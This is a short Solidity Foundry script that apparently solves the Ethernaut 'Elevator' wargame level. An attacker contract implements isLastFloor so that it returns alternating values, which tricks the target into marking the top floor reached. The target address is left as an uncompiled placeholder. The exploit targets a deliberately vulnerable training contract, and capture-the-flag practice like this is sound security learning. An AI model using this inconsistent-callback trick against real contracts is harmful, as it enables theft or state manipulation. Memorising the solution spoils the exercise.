// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/11_Elevator.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        ElevatorAttacker elevatorAttacker = new ElevatorAttacker();
        elevatorAttacker.attack();

        vm.stopBroadcast();
    }
}


contract ElevatorAttacker {
    Elevator level11 = Elevator(your_challenge_address);
    bool public floor = true;

    function attack() public{
        level11.goTo(0);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        floor = !floor;
        return floor;
    }
}